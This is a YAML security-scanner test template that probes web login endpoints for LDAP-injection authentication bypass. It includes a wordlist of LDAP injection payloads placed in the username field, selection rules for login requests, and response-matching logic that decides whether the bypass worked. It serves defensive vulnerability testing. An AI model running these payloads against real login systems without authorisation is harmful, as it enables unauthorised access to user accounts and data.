id: AUTH_BYPASS_LDAP
info:
  name: "Authentication Bypass by using LDAP payloads for Login endpoints"
  description: > 
    "Authentication Bypass via LDAP payloads manipulates login endpoints in web 
    applications. Attackers exploit vulnerabilities by injecting specially crafted 
    Lightweight Directory Access Protocol (LDAP) payloads, deceiving the 
    authentication process. This allows unauthorized access by tricking the 
    system into validating incorrect or manipulated credentials, emphasizing 
    the importance of secure coding practices and robust input validation mechanisms."
  details: >
    "Authentication Bypass using LDAP payloads is a technique where attackers 
    exploit vulnerabilities in web application login endpoints. By injecting 
    specially crafted LDAP payloads, they manipulate the authentication process 
    to grant unauthorized access. This method targets weaknesses in input 
    validation, allowing adversaries to trick the system into validating incorrect 
    credentials and gain illicit entry. Prevention involves implementing strong 
    input validation and secure coding practices."
  impact: >
    "Authentication Bypass through LDAP payloads can have severe consequences, 
    enabling unauthorized access to sensitive systems. Attackers can exploit 
    this vulnerability to compromise user accounts, access confidential data, 
    and potentially execute unauthorized actions within the application. The 
    impact extends to reputational damage, financial loss, and regulatory 
    consequences, underscoring the critical need for robust security measures to 
    prevent such exploits."
  remediation: "To mitigate Authentication Bypass via LDAP payloads, implement robust input validation mechanisms and adhere to secure coding practices. Specifically, sanitize and validate user inputs to prevent injection of specially crafted LDAP payloads. Implement strong authentication controls to detect and reject unauthorized access attempts. Regularly update and patch authentication systems to address any identified vulnerabilities. Additionally, consider implementing additional security measures such as multi-factor authentication to further strengthen authentication processes and protect against unauthorized access."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: AUTH_BYPASS_LDAP
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
    extract: resp_code
  response_payload:
    length:
      gt: 0
    not_contains_either:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  method:
    not_contains_either:
      - GET
  url:
    contains_either:
      - login
      - signin
      - authenticate
      - auth
  and:
    - request_payload:
        for_one:
          key:
            regex: "^username$|^user$|^userid$|^user_id$|^login$|^login_id$|^email$|^account$|^account_id$|^member$|^member_id$|^id$|^user_name$|^uname$|^identifier$|^user_identifier$|^admin$|^nick$|^nickname$|^handle$|^alias$|^principal$|^profile$|^profile_id$|^name$|^signin$|^auth$|^credential$|^user_login$|^user_account$|^user_email$|^employee$|^employee_id$|^operator$|^customer_id$|^client_id$|^subscriber$|^subscriber_id$|^participant$|^participant_id$|^client_id$|^userLoginID$|^client-name$"
            extract: userKey
    - request_payload:
        for_one:
          key:
            regex: "^password$|^pass$|^pwd$|^user_password$|^userpass$|^passwd$|^user_pwd$|^password1$|^userPass$|^login_password$|^loginpassword$|^user_pass$|^access_password$|^secret$|^user_secret$"
            extract: passKey
wordLists:
  specialCharacters:
    - "*"
    - "*)(&"
    - "*)(|(&"
    - "*)(|(*"
    - "*))%00"
    - "admin)(&)"
    - "admin)(!(&(|"
    - "admin))(|(|"

execute:
  type: single
  requests:
    - req:
      - modify_body_param:
          userKey: ${specialCharacters}
validate:
  response_code:
    eq: ${resp_code}
  response_payload:
    length:
      gt: 0
    percentage_match:
      gte: 90
    length:
      gt: 0
    not_contains_either:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts